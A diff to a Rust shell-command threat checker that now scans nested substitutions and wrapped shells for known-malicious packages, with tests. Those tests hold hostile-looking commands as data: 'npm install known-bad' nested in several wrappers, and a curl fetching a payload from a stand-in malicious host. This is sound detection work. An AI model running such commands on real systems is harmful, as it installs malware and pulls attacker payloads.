@@ -77,10 +77,11 @@ pub fn extract_packages_for_shell(segments: &[Segment], shell: ShellType) -> Vec
     let mut packages = Vec::new();
 
     for seg in segments {
-        let (resolved_command, resolved_args) = match crate::extract::resolve_wrapped_command(seg) {
-            Some(resolved) => resolved,
-            None => continue,
-        };
+        let (resolved_command, resolved_args) =
+            match crate::extract::resolve_wrapped_command_for_shell(seg, shell) {
+                Some(resolved) => resolved,
+                None => continue,
+            };
 
         let cmd_name = package_command_name(&resolved_command, shell);
         let args: Vec<String> = resolved_args
@@ -117,6 +118,40 @@ pub fn extract_packages_for_shell(segments: &[Segment], shell: ShellType) -> Vec
         }
     }
 
+    packages
+}
+
+const MAX_EXECUTABLE_PACKAGE_DEPTH: usize = 8;
+
+fn collect_executable_segments(
+    input: &str,
+    shell: ShellType,
+    depth: usize,
+    segments: &mut Vec<(Segment, ShellType)>,
+) {
+    let execution_view = crate::extract::shell_execution_view(input, shell);
+    segments.extend(
+        crate::tokenize::tokenize(execution_view.as_ref(), shell)
+            .into_iter()
+            .map(|segment| (segment, shell)),
+    );
+    if depth >= MAX_EXECUTABLE_PACKAGE_DEPTH {
+        return;
+    }
+    for body in crate::extract::executable_substitution_scan(input, shell).bodies {
+        collect_executable_segments(&body.input, body.shell, depth + 1, segments);
+    }
+}
+
+/// Extract package references from every statically visible executable body,
+/// preserving each child wrapper's effective shell.
+pub(crate) fn extract_packages_from_input(input: &str, shell: ShellType) -> Vec<PackageRef> {
+    let mut segments = Vec::new();
+    collect_executable_segments(input, shell, 0, &mut segments);
+    let mut packages = Vec::new();
+    for (segment, segment_shell) in segments {
+        packages.extend(extract_packages_for_shell(&[segment], segment_shell));
+    }
     packages
 }
 
@@ -1066,8 +1101,15 @@ pub fn check(
 
     let mut findings = Vec::new();
 
-    let segments = crate::tokenize::tokenize(input, shell);
-    let packages = extract_packages_for_shell(&segments, shell);
+    let mut executable_segments = Vec::new();
+    collect_executable_segments(input, shell, 0, &mut executable_segments);
+    let mut packages = Vec::new();
+    for (segment, segment_shell) in &executable_segments {
+        packages.extend(extract_packages_for_shell(
+            std::slice::from_ref(segment),
+            *segment_shell,
+        ));
+    }
 
     for pkg in &packages {
         let db_eco = pkg.ecosystem;
@@ -1249,9 +1291,9 @@ pub fn check(
     }
 
     // IP literals in command tokens (ssh/scp/nc and friends).
-    for seg in &segments {
+    for (seg, segment_shell) in &executable_segments {
         for arg in &seg.args {
-            if let Some(ip) = extract_ipv4_from_token_for_shell(arg, shell) {
+            if let Some(ip) = extract_ipv4_from_token_for_shell(arg, *segment_shell) {
                 if checked_ips.insert(ip) {
                     if let Some(m) = db.check_ip(ip) {
                         let (rule_id, severity, threat_type) = ip_rule_for_source(m.source);
@@ -1605,6 +1647,47 @@ mod tests {
         assert!(!clean
             .iter()
             .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage));
+    }
+
+    #[test]
+    fn malicious_package_in_nested_executable_body_reaches_threat_intel() {
+        let key = SigningKey::generate(&mut OsRng);
+        let mut writer = ThreatDbWriter::new(1_700_000_000, 96);
+        writer.add_package(
+            Ecosystem::Npm,
+            "known-bad",
+            &[],
+            ThreatSource::OssfMalicious,
+            Confidence::Confirmed,
+            true,
+            None,
+        );
+        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");
+
+        for (input, shell) in [
+            ("echo $(npm install known-bad)", ShellType::Posix),
+            ("sh -c 'npm install known-bad'", ShellType::Posix),
+            ("& { npm install known-bad }", ShellType::PowerShell),
+        ] {
+            let findings = check(input, shell, &[], Some(&db));
+            assert!(
+                findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::ThreatMaliciousPackage
+                        && finding.severity == Severity::Critical
+                }),
+                "nested package escaped threat intel: {input} -> {findings:?}"
+            );
+        }
+
+        let dormant = check(
+            "$block = { npm install known-bad }",
+            ShellType::PowerShell,
+            &[],
+            Some(&db),
+        );
+        assert!(dormant
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::ThreatMaliciousPackage));
     }
 
     #[test]
@@ -2324,6 +2407,27 @@ mod tests {
         let (rule, sev, _) = hostname_rule_for_source(threatdb::ThreatSource::Urlhaus);
         assert_eq!(rule, RuleId::ThreatMaliciousUrl);
         assert_eq!(sev, Severity::High);
+    }
+
+    #[test]
+    fn trailing_dot_hostname_alias_remains_a_high_threat_match() {
+        let key = SigningKey::generate(&mut OsRng);
+        let mut writer = ThreatDbWriter::new(1_700_000_000, 97);
+        writer.add_hostname("malicious.example", ThreatSource::Urlhaus);
+        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");
+        let command = "curl https://MALICIOUS.EXAMPLE./payload";
+        let extracted = crate::extract::extract_urls(command, ShellType::Posix);
+
+        let findings = check(command, ShellType::Posix, &extracted, Some(&db));
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::ThreatMaliciousUrl)
+            .expect("the command-facing lookup must match a DNS-equivalent trailing-dot alias");
+        assert_eq!(finding.severity, Severity::High);
+        assert_eq!(
+            crate::verdict::action_from_findings(&findings),
+            crate::verdict::Action::Block
+        );
     }
 
     #[test]
